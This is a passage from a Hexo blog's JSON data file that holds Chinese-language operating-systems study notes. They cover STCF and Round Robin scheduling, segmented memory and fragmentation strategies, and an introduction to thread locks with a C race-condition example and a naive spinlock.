job。</p>\n<p>这点有点违背现实。我们煮水时，是不会等水煮完再去洗杯子，而应该是等水开的时间里去洗。虽然这个例子并不适用于我们要说的这个算法，但理念是相同的：我们可以中断任务，然后执行其它任务。</p>\n<p>现在任务 A 是 100s 完成，B 是 10s 完成。还是最开始的问题：如果两个 job 先后进入队列里，应该怎麽办？</p>\n<p>在 SJF 里，如果 B 先进那还好，A 先进入的话，就出问题了。因爲 A 进入时，队列里还没有任何 job，那麽 CPU 理所当然的认爲 A 是最短的任务，然后执行它。这时候再进入 B，已经是执行 A 之后的事了，B 只能乖乖等 A 执行完。那麽 Turnaroud Time 平均时间和 FIFO 是完全一样的。</p>\n<p>$ 100+1102=105s\\cfrac{100+110}{2} = 105 s 2100+110​=105s $</p>\n<p>换成 STCF，如果 A 先后进入队列里，B 在进入，会发生什麽？首先，在 B 进来之前，A 是最短可完成的 job。在执行 1s 之后，队列 B 进来了。队列一看，发现 B 才是最短可完成的 job。于是 CPU 会中断，(关于 job 之前的切换，以后再提)然后换成执行 B，等 B 完成之后，再执行 A。</p>\n<p>$ 10+10+1002=60s\\cfrac{10+10+100}{2} = 60 s 210+10+100​=60s $</p>\n<p>减少近一半的时间。所以，这麽优化是值得的。这几乎是我们能想到，最优的算法了吧？</p>\n<h2 id=\"RR（Round-Robin）\"><a href=\"#RR（Round-Robin）\" class=\"headerlink\" title=\"RR（Round Robin）\"></a>RR（Round Robin）</h2><p>如果之满足于 Turnaroud Time ,那麽我们的任务应该在 STCF 提出时就结束了。但我们不能只满足于 Turnaroud Time 。</p>\n<p>假想，如果有三个 job，每一 job 都要花 1000s，在第一个 job 完成之前，你得等到 1000s 之后，才能看到第二个 job 开始工作。天！我想要知道自己输进去的式子有没有问题，必须等到 1000s 后，才能看到第一次运行！响应太慢了！</p>\n<p>能想到最简单的办法，就是加快 STCF 的切换过程。比如，A 执行几秒，B 执行几秒，这样不停的切换就好了。这也是 Round Robin 算法的核心。</p>\n<p>不过，如果这样的法，STCF 的关键<strong>最短可完成</strong>就没了，同时，频繁切换进程也会产生很大的花销，切换得越快，花销就越多，这样是否值得？换而言之，我们 STCF 算法依然不是我们想要的，最优的，算法。</p>\n<hr>\n<h2 id=\"最关键的问题\"><a href=\"#最关键的问题\" class=\"headerlink\" title=\"最关键的问题\"></a>最关键的问题</h2><p>我们要找到一个算法，它的 <em>Turnaroud Time</em> 期望最小，同时，还要很快的响应。这才是我们的目标。</p>\n<p>还有，我们还要解决从最开始就设下的，绝对不可以忽视的，上面所有算法的根基条件。破坏这个条件，也意味着，上面的一切算法将会轰然倒塌，那就是：我们无法知道任务的运行时间。</p>\n","site":{"data":{}},"excerpt":"<p>说完 SJF 算法，我们再来看看一个新的问题。</p>\n<p>如果，所有的任务并不是同时进入队列怎麽办？</p>","more":"<p>SJF 算法之所以成立，很重要的一点是：我们知道队列里所有 job，并且比较了它们。假如，哪怕是 1s，两个任务先后进入了队列，我们的 CPU 可能就无法比较它们，然后找出最短的 job，SJF 算法也就崩分离析，变回了 FIFO。</p>\n<p>爲了解决这个问题，我们在 SJF 的高度上，再做一点修改。</p>\n<h2 id=\"最先能完成的先来-STCF-Short-Time-to-Completion-First\"><a href=\"#最先能完成的先来-STCF-Short-Time-to-Completion-First\" class=\"headerlink\" title=\"最先能完成的先来 STCF (Short Time-to-Completion First)\"></a>最先能完成的先来 STCF (Short Time-to-Completion First)</h2><p>前面的两个算法，无论是 FIFO 还是 SJF 都是按顺序执行的，也就是说，队列前面的 job 没完成，是不能执行后面的 job。</p>\n<p>这点有点违背现实。我们煮水时，是不会等水煮完再去洗杯子，而应该是等水开的时间里去洗。虽然这个例子并不适用于我们要说的这个算法，但理念是相同的：我们可以中断任务，然后执行其它任务。</p>\n<p>现在任务 A 是 100s 完成，B 是 10s 完成。还是最开始的问题：如果两个 job 先后进入队列里，应该怎麽办？</p>\n<p>在 SJF 里，如果 B 先进那还好，A 先进入的话，就出问题了。因爲 A 进入时，队列里还没有任何 job，那麽 CPU 理所当然的认爲 A 是最短的任务，然后执行它。这时候再进入 B，已经是执行 A 之后的事了，B 只能乖乖等 A 执行完。那麽 Turnaroud Time 平均时间和 FIFO 是完全一样的。</p>\n<p>$ 100+1102=105s\\cfrac{100+110}{2} = 105 s 2100+110​=105s $</p>\n<p>换成 STCF，如果 A 先后进入队列里，B 在进入，会发生什麽？首先，在 B 进来之前，A 是最短可完成的 job。在执行 1s 之后，队列 B 进来了。队列一看，发现 B 才是最短可完成的 job。于是 CPU 会中断，(关于 job 之前的切换，以后再提)然后换成执行 B，等 B 完成之后，再执行 A。</p>\n<p>$ 10+10+1002=60s\\cfrac{10+10+100}{2} = 60 s 210+10+100​=60s $</p>\n<p>减少近一半的时间。所以，这麽优化是值得的。这几乎是我们能想到，最优的算法了吧？</p>\n<h2 id=\"RR（Round-Robin）\"><a href=\"#RR（Round-Robin）\" class=\"headerlink\" title=\"RR（Round Robin）\"></a>RR（Round Robin）</h2><p>如果之满足于 Turnaroud Time ,那麽我们的任务应该在 STCF 提出时就结束了。但我们不能只满足于 Turnaroud Time 。</p>\n<p>假想，如果有三个 job，每一 job 都要花 1000s，在第一个 job 完成之前，你得等到 1000s 之后，才能看到第二个 job 开始工作。天！我想要知道自己输进去的式子有没有问题，必须等到 1000s 后，才能看到第一次运行！响应太慢了！</p>\n<p>能想到最简单的办法，就是加快 STCF 的切换过程。比如，A 执行几秒，B 执行几秒，这样不停的切换就好了。这也是 Round Robin 算法的核心。</p>\n<p>不过，如果这样的法，STCF 的关键<strong>最短可完成</strong>就没了，同时，频繁切换进程也会产生很大的花销，切换得越快，花销就越多，这样是否值得？换而言之，我们 STCF 算法依然不是我们想要的，最优的，算法。</p>\n<hr>\n<h2 id=\"最关键的问题\"><a href=\"#最关键的问题\" class=\"headerlink\" title=\"最关键的问题\"></a>最关键的问题</h2><p>我们要找到一个算法，它的 <em>Turnaroud Time</em> 期望最小，同时，还要很快的响应。这才是我们的目标。</p>\n<p>还有，我们还要解决从最开始就设下的，绝对不可以忽视的，上面所有算法的根基条件。破坏这个条件，也意味着，上面的一切算法将会轰然倒塌，那就是：我们无法知道任务的运行时间。</p>"},{"title":"段式存储","date":"2019-09-22T16:00:00.000Z","_content":"\n之前提及过页式存储。今天想来聊一聊段式存储。\n\n<!-- more -->\n\n在概念上，段式存储比段页式简单得多。后面的所有东西都建立在 base-bound 对上。换而言之，每一段都有一个 base (基底) 和 bound(上限)。\n\n于是，我们将每一个程序分成三个段。code、heap、stack，分别对应着每一个程序需要的三部分：指令、堆、栈。当我们获得一个虚拟地址时，我们怎麽知道它对应着这三部分的哪一块？最简单的办法就是将地址的前两位用作辨识位，比如：01 代表 code，10 代表heap，11 代表 stack。\n\ncode 区，顾名思义，就是存放代码，存放指令的区域。heap 段用于存放 malloc 分配出来的数据。stack 比较特殊，它是从高地址往低地址长。\n\nstack 这块区域用来存放变量，同时，它还负责函数调用。当发生函数调用时，要将参数，以及调用函数的地址都要存进栈里，同时，还要将寄存器里清空，装上调用函数的值。当函数执行完时，通过调用函数的地址，回到上一个函数里，同时，还要復原寄存器。\n\n所以有时候我们不建义过份的调用函数，因爲调用函数时，面临着切换上下文等複杂的操作。这些工作实在是太浪费资源了。\n\n当然，除此以外还有 BBS 段，data 段，不过重点不在这里。\n\n> ## 与之而来的\n\n在好处这点上，和分页式很像：简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）。\n\n同时，分段之后，也便于多个进程共享代码、数据。\n\n但是，因爲段是有 base-bound 的界线。这就会出来一个问题：太小的空间无法分给段。比如一个 700 kb 的空间，每段要 300 kb，那麽就会有 100 Kb 的空间无法使用。在多次 malloc 和 free 之后，内存空间里，就会有许许多多的碎片。\n\n举个简单的例子：\n\n![](1569248244054.png)\n\n之前给程序分配了三部分，0-10, 10-20, 20-30。在使用一段时间之后，第一段和第三段被 free。就留下了中间 10-20 的段。\n\n在这种情况下，我想要 15 大小的空间就完全不可能了。因爲第一段，第三段都只有 10。明明剩下的空间有 20，却连 15 都分不出来。\n\n这就是碎片。\n\n> ## 解决碎片\n\n虽然存在碎片的问题，但并非不可以解决。\n\n一是通过回收聚合，二是在分配时，做点小工作，比如下面的几种办法。\n\n最简单的解决途径：best fit、worst fit。每次选空间时，总是选最大或最小的片段，基本解决了大量的碎片问题。但选最大或最小都不得不进行一次遍历，这就是 O(n) 的问题了。\n\n也有比较巧的办法，比如 Segregated LIsts。通过再建一条常用对象 list，将常用大小的空间留出来，如果大小符合，就先使用，否则就使用另一条任意大小的空间。\n\n另一种办法是 Buddy Allocation。核心思想就是递归分集。\n\n![](1569248251853.png)\n\n这样子，一旦分到不能装下需要的空间时，那麽就是最合适的段了。虽然有可能出现内部碎片（比如，在这里只要了 6 KB，剩下 2 KB就浪费了），但回收时，非常便利。只要看相领的段有没有被使用，使用了就暂时不回收，否则回收聚合，相当轻快。\n\n补充完段式，关于虚拟地址的内容差不多就结束了。下次将重点转到併发上。\n","source":"_posts/段式存储.md","raw":"---\ntitle: 段式存储\ndate: 2019-09-23\ntags:\n---\n\n之前提及过页式存储。今天想来聊一聊段式存储。\n\n<!-- more -->\n\n在概念上，段式存储比段页式简单得多。后面的所有东西都建立在 base-bound 对上。换而言之，每一段都有一个 base (基底) 和 bound(上限)。\n\n于是，我们将每一个程序分成三个段。code、heap、stack，分别对应着每一个程序需要的三部分：指令、堆、栈。当我们获得一个虚拟地址时，我们怎麽知道它对应着这三部分的哪一块？最简单的办法就是将地址的前两位用作辨识位，比如：01 代表 code，10 代表heap，11 代表 stack。\n\ncode 区，顾名思义，就是存放代码，存放指令的区域。heap 段用于存放 malloc 分配出来的数据。stack 比较特殊，它是从高地址往低地址长。\n\nstack 这块区域用来存放变量，同时，它还负责函数调用。当发生函数调用时，要将参数，以及调用函数的地址都要存进栈里，同时，还要将寄存器里清空，装上调用函数的值。当函数执行完时，通过调用函数的地址，回到上一个函数里，同时，还要復原寄存器。\n\n所以有时候我们不建义过份的调用函数，因爲调用函数时，面临着切换上下文等複杂的操作。这些工作实在是太浪费资源了。\n\n当然，除此以外还有 BBS 段，data 段，不过重点不在这里。\n\n> ## 与之而来的\n\n在好处这点上，和分页式很像：简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）。\n\n同时，分段之后，也便于多个进程共享代码、数据。\n\n但是，因爲段是有 base-bound 的界线。这就会出来一个问题：太小的空间无法分给段。比如一个 700 kb 的空间，每段要 300 kb，那麽就会有 100 Kb 的空间无法使用。在多次 malloc 和 free 之后，内存空间里，就会有许许多多的碎片。\n\n举个简单的例子：\n\n![](1569248244054.png)\n\n之前给程序分配了三部分，0-10, 10-20, 20-30。在使用一段时间之后，第一段和第三段被 free。就留下了中间 10-20 的段。\n\n在这种情况下，我想要 15 大小的空间就完全不可能了。因爲第一段，第三段都只有 10。明明剩下的空间有 20，却连 15 都分不出来。\n\n这就是碎片。\n\n> ## 解决碎片\n\n虽然存在碎片的问题，但并非不可以解决。\n\n一是通过回收聚合，二是在分配时，做点小工作，比如下面的几种办法。\n\n最简单的解决途径：best fit、worst fit。每次选空间时，总是选最大或最小的片段，基本解决了大量的碎片问题。但选最大或最小都不得不进行一次遍历，这就是 O(n) 的问题了。\n\n也有比较巧的办法，比如 Segregated LIsts。通过再建一条常用对象 list，将常用大小的空间留出来，如果大小符合，就先使用，否则就使用另一条任意大小的空间。\n\n另一种办法是 Buddy Allocation。核心思想就是递归分集。\n\n![](1569248251853.png)\n\n这样子，一旦分到不能装下需要的空间时，那麽就是最合适的段了。虽然有可能出现内部碎片（比如，在这里只要了 6 KB，剩下 2 KB就浪费了），但回收时，非常便利。只要看相领的段有没有被使用，使用了就暂时不回收，否则回收聚合，相当轻快。\n\n补充完段式，关于虚拟地址的内容差不多就结束了。下次将重点转到併发上。\n","slug":"段式存储","published":1,"updated":"2020-03-07T08:01:18.683Z","_id":"ck7h7wnck0007633x1jqddsen","comments":1,"layout":"post","photos":[],"link":"","content":"<p>之前提及过页式存储。今天想来聊一聊段式存储。</p>\n<a id=\"more\"></a>\n\n<p>在概念上，段式存储比段页式简单得多。后面的所有东西都建立在 base-bound 对上。换而言之，每一段都有一个 base (基底) 和 bound(上限)。</p>\n<p>于是，我们将每一个程序分成三个段。code、heap、stack，分别对应着每一个程序需要的三部分：指令、堆、栈。当我们获得一个虚拟地址时，我们怎麽知道它对应着这三部分的哪一块？最简单的办法就是将地址的前两位用作辨识位，比如：01 代表 code，10 代表heap，11 代表 stack。</p>\n<p>code 区，顾名思义，就是存放代码，存放指令的区域。heap 段用于存放 malloc 分配出来的数据。stack 比较特殊，它是从高地址往低地址长。</p>\n<p>stack 这块区域用来存放变量，同时，它还负责函数调用。当发生函数调用时，要将参数，以及调用函数的地址都要存进栈里，同时，还要将寄存器里清空，装上调用函数的值。当函数执行完时，通过调用函数的地址，回到上一个函数里，同时，还要復原寄存器。</p>\n<p>所以有时候我们不建义过份的调用函数，因爲调用函数时，面临着切换上下文等複杂的操作。这些工作实在是太浪费资源了。</p>\n<p>当然，除此以外还有 BBS 段，data 段，不过重点不在这里。</p>\n<blockquote>\n<h2 id=\"与之而来的\"><a href=\"#与之而来的\" class=\"headerlink\" title=\"与之而来的\"></a>与之而来的</h2></blockquote>\n<p>在好处这点上，和分页式很像：简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）。</p>\n<p>同时，分段之后，也便于多个进程共享代码、数据。</p>\n<p>但是，因爲段是有 base-bound 的界线。这就会出来一个问题：太小的空间无法分给段。比如一个 700 kb 的空间，每段要 300 kb，那麽就会有 100 Kb 的空间无法使用。在多次 malloc 和 free 之后，内存空间里，就会有许许多多的碎片。</p>\n<p>举个简单的例子：</p>\n<p><img src=\"1569248244054.png\" alt=\"\"></p>\n<p>之前给程序分配了三部分，0-10, 10-20, 20-30。在使用一段时间之后，第一段和第三段被 free。就留下了中间 10-20 的段。</p>\n<p>在这种情况下，我想要 15 大小的空间就完全不可能了。因爲第一段，第三段都只有 10。明明剩下的空间有 20，却连 15 都分不出来。</p>\n<p>这就是碎片。</p>\n<blockquote>\n<h2 id=\"解决碎片\"><a href=\"#解决碎片\" class=\"headerlink\" title=\"解决碎片\"></a>解决碎片</h2></blockquote>\n<p>虽然存在碎片的问题，但并非不可以解决。</p>\n<p>一是通过回收聚合，二是在分配时，做点小工作，比如下面的几种办法。</p>\n<p>最简单的解决途径：best fit、worst fit。每次选空间时，总是选最大或最小的片段，基本解决了大量的碎片问题。但选最大或最小都不得不进行一次遍历，这就是 O(n) 的问题了。</p>\n<p>也有比较巧的办法，比如 Segregated LIsts。通过再建一条常用对象 list，将常用大小的空间留出来，如果大小符合，就先使用，否则就使用另一条任意大小的空间。</p>\n<p>另一种办法是 Buddy Allocation。核心思想就是递归分集。</p>\n<p><img src=\"1569248251853.png\" alt=\"\"></p>\n<p>这样子，一旦分到不能装下需要的空间时，那麽就是最合适的段了。虽然有可能出现内部碎片（比如，在这里只要了 6 KB，剩下 2 KB就浪费了），但回收时，非常便利。只要看相领的段有没有被使用，使用了就暂时不回收，否则回收聚合，相当轻快。</p>\n<p>补充完段式，关于虚拟地址的内容差不多就结束了。下次将重点转到併发上。</p>\n","site":{"data":{}},"excerpt":"<p>之前提及过页式存储。今天想来聊一聊段式存储。</p>","more":"<p>在概念上，段式存储比段页式简单得多。后面的所有东西都建立在 base-bound 对上。换而言之，每一段都有一个 base (基底) 和 bound(上限)。</p>\n<p>于是，我们将每一个程序分成三个段。code、heap、stack，分别对应着每一个程序需要的三部分：指令、堆、栈。当我们获得一个虚拟地址时，我们怎麽知道它对应着这三部分的哪一块？最简单的办法就是将地址的前两位用作辨识位，比如：01 代表 code，10 代表heap，11 代表 stack。</p>\n<p>code 区，顾名思义，就是存放代码，存放指令的区域。heap 段用于存放 malloc 分配出来的数据。stack 比较特殊，它是从高地址往低地址长。</p>\n<p>stack 这块区域用来存放变量，同时，它还负责函数调用。当发生函数调用时，要将参数，以及调用函数的地址都要存进栈里，同时，还要将寄存器里清空，装上调用函数的值。当函数执行完时，通过调用函数的地址，回到上一个函数里，同时，还要復原寄存器。</p>\n<p>所以有时候我们不建义过份的调用函数，因爲调用函数时，面临着切换上下文等複杂的操作。这些工作实在是太浪费资源了。</p>\n<p>当然，除此以外还有 BBS 段，data 段，不过重点不在这里。</p>\n<blockquote>\n<h2 id=\"与之而来的\"><a href=\"#与之而来的\" class=\"headerlink\" title=\"与之而来的\"></a>与之而来的</h2></blockquote>\n<p>在好处这点上，和分页式很像：简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）。</p>\n<p>同时，分段之后，也便于多个进程共享代码、数据。</p>\n<p>但是，因爲段是有 base-bound 的界线。这就会出来一个问题：太小的空间无法分给段。比如一个 700 kb 的空间，每段要 300 kb，那麽就会有 100 Kb 的空间无法使用。在多次 malloc 和 free 之后，内存空间里，就会有许许多多的碎片。</p>\n<p>举个简单的例子：</p>\n<p><img src=\"1569248244054.png\" alt=\"\"></p>\n<p>之前给程序分配了三部分，0-10, 10-20, 20-30。在使用一段时间之后，第一段和第三段被 free。就留下了中间 10-20 的段。</p>\n<p>在这种情况下，我想要 15 大小的空间就完全不可能了。因爲第一段，第三段都只有 10。明明剩下的空间有 20，却连 15 都分不出来。</p>\n<p>这就是碎片。</p>\n<blockquote>\n<h2 id=\"解决碎片\"><a href=\"#解决碎片\" class=\"headerlink\" title=\"解决碎片\"></a>解决碎片</h2></blockquote>\n<p>虽然存在碎片的问题，但并非不可以解决。</p>\n<p>一是通过回收聚合，二是在分配时，做点小工作，比如下面的几种办法。</p>\n<p>最简单的解决途径：best fit、worst fit。每次选空间时，总是选最大或最小的片段，基本解决了大量的碎片问题。但选最大或最小都不得不进行一次遍历，这就是 O(n) 的问题了。</p>\n<p>也有比较巧的办法，比如 Segregated LIsts。通过再建一条常用对象 list，将常用大小的空间留出来，如果大小符合，就先使用，否则就使用另一条任意大小的空间。</p>\n<p>另一种办法是 Buddy Allocation。核心思想就是递归分集。</p>\n<p><img src=\"1569248251853.png\" alt=\"\"></p>\n<p>这样子，一旦分到不能装下需要的空间时，那麽就是最合适的段了。虽然有可能出现内部碎片（比如，在这里只要了 6 KB，剩下 2 KB就浪费了），但回收时，非常便利。只要看相领的段有没有被使用，使用了就暂时不回收，否则回收聚合，相当轻快。</p>\n<p>补充完段式，关于虚拟地址的内容差不多就结束了。下次将重点转到併发上。</p>"},{"title":"线程锁（一）","date":"2019-10-12T16:00:00.000Z","_content":"以前在阅读有关于 Python 性能的文章时，总是有人提到「僞线程」和「线程锁」这两个词。由于基础不够，当有人提到 Python 性能时，我也只能学着他们，说「Python 是僞线程啦！不行啦！」之类的话。但是，印在我股子里的装B劲，还是渴望有一天能理解，究竟何爲「锁」？爲何需要「锁」？如何「锁」？以及「GIL的问题」。\n\n<!-- more -->\n\n## 何爲锁？\n\n![](1570974760163.png)\n\n如上面这张图所展示的，在运行多线程 Python 程序时，CPU 内只允许一个线程运行，开始运行其中一个线程时，一定要将「锁」住，不让其它线程运行。当要运行其它线程时，会打开锁，然后再执行第二个线程。如此一来，同一个 CPU 里，只允许一个线程运行。\n\n## 爲何需要锁？\n\n当然，你也许会想：正常情况下，单核 CPU 也是一次运行一个线程，然后系统中断去执行其它线程，锁的意义何在啊？\n\n的确，系统中断是现代系统的基础，但也因爲它的存在，不得不使用锁。\n\n举个简单明了的例子。\n\n```\n1 #include <stdio.h>\n2 #include <pthread.h>\n3 #include \"mythreads.h\"\n4\n5 static volatile int counter = 0;\n6\n7 //\n8 // mythread()\n9 //\n10 // 用循环将1加到1e7\n11 // 这不是展示如何使用线程\n12 // 而是表达线程的问题\n13 //\n14 void *\n15 mythread(void * arg)\n16 {\n17 printf(\"%s: begin\\n\", (char * ) arg);\n18 int i;\n19 for (i = 0; i < 1e7; i++) {\n20 counter = counter + 1;\n21 }\n22 printf(\"%s: done\\n\", (char * ) arg);\n23 return NULL;\n24 }\n25\n26 //\n27 // main()\n28 //\n29 // 运行两个线程\n30 // 然后等待它们完成（Pthread_join）\n31 //\n32 int\n33 main(int argc, char * argv[])\n34 {\n35 pthread_t p1, p2;\n36 printf(\"main: begin (counter = %d)\\n\", counter);\n37 Pthread_create(&p1, NULL, mythread, \"A\");\n38 Pthread_create(&p2, NULL, mythread, \"B\");\n39\n40 // join waits for the threads to finish\n41 Pthread_join(p1, NULL);\n42 Pthread_join(p2, NULL);\n43 printf(\"main: done with both (counter = %d)\\n\", counter);\n44 return 0;\n45 }\n```\n\n上面的这段代码，使用了两个线程操作一个全局变量 counter，每个线程都将它加到 1e7。可以预见，它最后的结果将是 2e7。可是，实际运行下来，并非如此。\n\n![](1570974768741.png)\n\n![](1570974768743.png)\n\n![](1570974769063.png)\n\n三次运行下来，结果完全不同。\n\n这违反了我们的直觉。明明同一段代码，操作同一个变量，爲什麽出来了完全不同的答案？\n\n原因不难解释，我们先来看看 X86 架构下 加法 操作对应的汇编代码。\n\n```\nmov 0xabcde, %eax\nadd 0x1, %eax\nmov %eax, 0xabcde\n```\n\n在计算机中，加法操作分成三部分。\n\n1. 将被加数放进 寄存器\n2. 对 寄存器 进行加法\n3. 将 寄存器 里的数字放到原先被加数的地址\n\n问题也就出在这三部操作这里。抢佔调度发生时，它可不管你在做什麽。很可能就会发生下面的情景。\n\n- counter = 6\n\n- add 0x1, %eax (此时 %eax 变成了 7，但并没有存到 counter )\n\n- CPU 被抢佔\n\n- 第二个线程做完加法，counter = 7\n\n- 恢復到第一个线程，将 %eax 的 7 存到 counter\n\n- counter = 7\n\n注意，我们 的 counter 两次加 1，却只从 6 变到 7！\n\n正是由于系统中断，使得本应一次完成的事情，分成了两次完成，造成了数据的两次计算。这也是问题的最大根原。\n\n爲此，我们必须考虑：在进行某些操作时，避免因中断（切换上下文 ）导致原子性问题。\n如何锁\n\n由于原子性问题是因中断导致的，在不引入新的指令前，最先想到的办法就是：在执行一些重要操作时，干掉中断！比如：\n\n```\nint faker(){\n    lock();\n    a = a + 1;\n    unlock();\n}\n```\n\n在执行 lock 之后，干掉中断，执行完后面的代码之后，再 unlock，打开中断。大略一看，是不错的想法。但别忘了我们最初设计中断的原因。是要避免下面这种情况：\n\n```\nint loop_function(){\n    lock();\n    while(1){\n        do_something();\n    }\n    unlock();\n}\n```\n\n显然，一旦某个大坏蛋（或者二伍仔）写了上面的代码，除了关机，没任何办法可以夺回 CPU 了。更何况，关掉中断只能关掉当前的处理器，其它的处理器依然会中断，然后搞坏计算结果。关掉中断真是个糟透的想法。\n\n那换个想法，但无限循环这个办法可以用在我们接下来的设计上。(爲了方便，我使用 python 改写教材里的示例，这段代码在 python 中没有多少意义)\n\n```\nclass lock_t():\n    def init(self):\n        self.flag = 0\n\ndef init(mutex):\n    mutex.flag = 0\n    \ndef lock(mutex):\n    while (mutex.flag == 1):\n        continue\n    mutex.flag = 1\n    \ndef unlock(mutex):\n    mutex.flag = 0\n```\n\n上面的代码是定义锁的「锁」、「开锁」功能。现在假设线程 A 在运行，它准备做一个原子操作，同时 mutex 对象是全局对象。那麽，代码可能是这样的。\n\n```\ndef do():\n    lock(mutex) # A 线程执行到这里\n    a = a+1\n    unlock(mutex)\n```\n\n此时，线程 B 夺得了 CPU 的使用权。它也会执行 lock(mutex)。但它运行到\n\n```\nwhile (mutex.flag == 1)\n```\n\n时，因爲 A 已经先执行了，所以 mute.flag 已经是 1 了。在 B 运行期间，因爲 mutex.flag 是 1 的原故，它被困在了 while loop 里。\n\n然后等到 A 夺回 CPU 使用权。A 做完 a = a+1，然后 unlock(mutex)，mutex.flag 变回了 0。此时，假设 B 又夺到了 CPU 使用权。mutex.flag 已经是 0 了，从 while loop 里跳出。。。\n\n就这样，一个简单的锁就完成了。\n\n但，真的一点问题也没有吗？\n","source":"_posts/线程锁（一）.md","raw":"---\ntitle: 线程锁（一）\ndate: 2019-10-13\ntags:\n---\n以前在阅读有关于 Python 性能的文章时，总是有人提到「僞线程」和「线程锁」这两个词。由于基础不够，当有人提到 Python 性能时，我也只能学着他们，说「Python 是僞线程啦！不行啦！」之类的话。但是，印在我股子里的装B劲，还是渴望有一天能理解，究竟何爲「锁」？爲何需要「锁」？如何「锁」？以及「GIL的问题」。\n\n<!-- more -->\n\n## 何爲锁？\n\n![](1570974760163.png)\n\n如上面这张图所展示的，在运行多线程 Python 程序时，CPU 内只允许一个线程运行，开始运行其中一个线程时，一定要将「锁」住，不让其它线程运行。当要运行其它线程时，会打开锁，然后再执行第二个线程。如此一来，同一个 CPU 里，只允许一个线程运行。\n\n## 爲何需要锁？\n\n当然，你也许会想：正常情况下，单核 CPU 也是一次运行一个线程，然后系统中断去执行其它线程，锁的意义何在啊？\n\n的确，系统中断是现代系统的基础，但也因爲它的存在，不得不使用锁。\n\n举个简单明了的例子。\n\n```\n1 #include <stdio.h>\n2 #include <pthread.h>\n3 #include \"mythreads.h\"\n4\n5 static volatile int counter = 0;\n6\n7 //\n8 // mythread()\n9 //\n10 // 用循环将1加到1e7\n11 // 这不是展示如何使用线程\n12 // 而是表达线程的问题\n13 //\n14 void *\n15 mythread(void * arg)\n16 {\n17 printf(\"%s: begin\\n\", (char * ) arg);\n18 int i;\n19 for (i = 0; i < 1e7; i++) {\n20 counter = counter + 1;\n21 }\n22 printf(\"%s: done\\n\", (char * ) arg);\n23 return NULL;\n24 }\n25\n26 //\n27 // main()\n28 //\n29 // 运行两个线程\n30 // 然后等待它们完成（Pthread_join）\n31 //\n32 int\n33 main(int argc, char * argv[])\n34 {\n35 pthread_t p1, p2;\n36 printf(\"main: begin (counter = %d)\\n\", counter);\n37 Pthread_create(&p1, NULL, mythread, \"A\");\n38 Pthread_create(&p2, NULL, mythread, \"B\");\n39\n40 // join waits for the threads to finish\n41 Pthread_join(p1, NULL);\n42 Pthread_join(p2, NULL);\n43 printf(\"main: done with both (counter = %d)\\n\", counter);\n44 return 0;\n45 }\n```\n\n上面的这段代码，使用了两个线程操作一个全局变量 counter，每个线程都将它加到 1e7。可以预见，它最后的结果将是 2e7。可是，实际运行下来，并非如此。\n\n![](1570974768741.png)\n\n![](1570974768743.png)\n\n![](1570974769063.png)\n\n三次运行下来，结果完全不同。\n\n这违反了我们的直觉。明明同一段代码，操作同一个变量，爲什麽出来了完全不同的答案？\n\n原因不难解释，我们先来看看 X86 架构下 加法 操作对应的汇编代码。\n\n```\nmov 0xabcde, %eax\nadd 0x1, %eax\nmov %eax, 0xabcde\n```\n\n在计算机中，加法操作分成三部分。\n\n1. 将被加数放进 寄存器\n2. 对 寄存器 进行加法\n3. 将 寄存器 里的数字放到原先被加数的地址\n\n问题也就出在这三部操作这里。抢佔调度发生时，它可不管你在做什麽。很可能就会发生下面的情景。\n\n- counter = 6\n\n- add 0x1, %eax (此时 %eax 变成了 7，但并没有存到 counter )\n\n- CPU 被抢佔\n\n- 第二个线程做完加法，counter = 7\n\n- 恢復到第一个线程，将 %eax 的 7 存到 counter\n\n- counter = 7\n\n注意，我们 的 counter 两次加 1，却只从 6 变到 7！\n\n正是由于系统中断，使得本应一次完成的事情，分成了两次完成，造成了数据的两次计算。这也是问题的最大根原。\n\n爲此，我们必须考虑：在进行某些操作时，避免因中断（切换上下文 ）导致原子性问题。\n如何锁\n\n由于原子性问题是因中断导致的，在不引入新的指令前，最先想到的办法就是：在执行一些重要操作时，干掉中断！比如：\n\n```\nint faker(){\n    lock();\n    a = a + 1;\n    unlock();\n}\n```\n\n在执行 lock 之后，干掉中断，执行完后面的代码之后，再 unlock，打开中断。大略一看，是不错的想法。但别忘了我们最初设计中断的原因。是要避免下面这种情况：\n\n```\nint loop_function(){\n    lock();\n    while(1){\n        do_something();\n    }\n    unlock();\n}\n```\n\n显然，一旦某个大坏蛋（或者二伍仔）写了上面的代码，除了关机，没任何办法可以夺回 CPU 了。更何况，关掉中断只能关掉当前的处理器，其它的处理器依然会中断，然后搞坏计算结果。关掉中断真是个糟透的想法。\n\n那换个想法，但无限循环这个办法可以用在我们接下来的设计上。(爲了方便，我使用 python 改写教材里的示例，这段代码在 python 中没有多少意义)\n\n```\nclass lock_t():\n    def init(self):\n        self.flag = 0\n\ndef init(mutex):\n    mutex.flag = 0\n    \ndef lock(mutex):\n    while (mutex.flag == 1):\n        continue\n    mutex.flag = 1\n    \ndef unlock(mutex):\n    mutex.flag = 0\n```\n\n上面的代码是定义锁的「锁」、「开锁」功能。现在假设线程 A 在运行，它准备做一个原子操作，同时 mutex 对象是全局对象。那麽，代码可能是这样的。\n\n```\ndef do():\n    lock(mutex) # A 线程执行到这里\n    a = a+1\n    unlock(mutex)\n```\n\n此时，线程 B 夺得了 CPU 的使用权。它也会执行 lock(mutex)。但它运行到\n\n```\nwhile (mutex.flag == 1)\n```\n\n时，因爲 A 已经先执行了，所以 mute.flag 已经是 1 了。在 B 运行期间，因爲 mutex.flag 是 1 的原故，它被困在了 while loop 里。\n\n然后等到 A 夺回 CPU 使用权。A 做完 a = a+1，然后 unlock(mutex)，mutex.flag 变回了 0。此时，假设 B 又夺到了 CPU 使用权。mutex.flag 已经是 0 了，从 while loop 里跳出。。。\n\n就这样，一个简单的锁就完成了。\n\n但，真的一点问题也没有吗？\n","slug":"线程锁（一）","published":1,"updated":"2020-03-07T08:01:58.294Z","_id":"ck7h80pzh0008633x5t276ads","comments":1,"layout":"post","photos":[],"link":"","content":"<p>以前在阅读有关于 Python 性能的文章时，总是有人提到「僞线程」和「线程锁」这两个词。由于基础不够，当有人提到 Python 性能时，我也只能学着他们，说「Python 是僞线程啦！不行啦！」之类的话。但是，印在我股子里的装B劲，还是渴望有一天能理解，究竟何爲「锁」？爲何需要「锁」？如何「锁」？以及「GIL的问题」。</p>\n<a id=\"more\"></a>\n\n<h2 